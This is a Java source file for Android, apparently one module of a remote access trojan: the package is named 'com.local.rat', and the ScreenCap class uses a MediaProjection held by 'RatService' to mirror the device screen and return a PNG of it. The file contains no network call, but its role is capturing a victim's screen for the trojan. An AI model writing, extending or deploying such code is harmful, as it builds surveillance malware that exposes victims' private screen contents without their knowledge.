package com.local.rat;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCap {
    public static byte[] capture() {
        MediaProjection proj = RatService.projection;
        if (proj == null) return null;
        Context ctx = AppCtx.get();
        if (ctx == null) return null;

        DisplayMetrics dm = ctx.getResources().getDisplayMetrics();
        int w = dm.widthPixels, h = dm.heightPixels, dpi = dm.densityDpi;

        final ImageReader reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
        VirtualDisplay vd = proj.createVirtualDisplay(
                "cap", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.getSurface(), null, new Handler(Looper.getMainLooper()));

        long deadline = System.currentTimeMillis() + 1500;
        Image img = null;
        while (System.currentTimeMillis() < deadline) {
            img = reader.acquireLatestImage();
            if (img != null) break;
            try { Thread.sleep(50); } catch (InterruptedException ignored) {}
        }

        byte[] out = null;
        if (img != null) {
            try {
                Image.Plane p = img.getPlanes()[0];
                ByteBuffer buf = p.getBuffer();
                int rowStride = p.getRowStride();
                int pixStride = p.getPixelStride();
                int rowPadding = rowStride - pixStride * w;

                Bitmap bmp = Bitmap.createBitmap(
                        w + rowPadding / pixStride, h, Bitmap.Config.ARGB_8888);
                bmp.copyPixelsFromBuffer(buf);

                Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, w, h);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                cropped.compress(Bitmap.CompressFormat.PNG, 100, bos);
                out = bos.toByteArray();

                bmp.recycle(); cropped.recycle();
            } catch (Exception ignored) {
            } finally { img.close(); }
        }
        vd.release();
        reader.close();
        return out;
    }
}
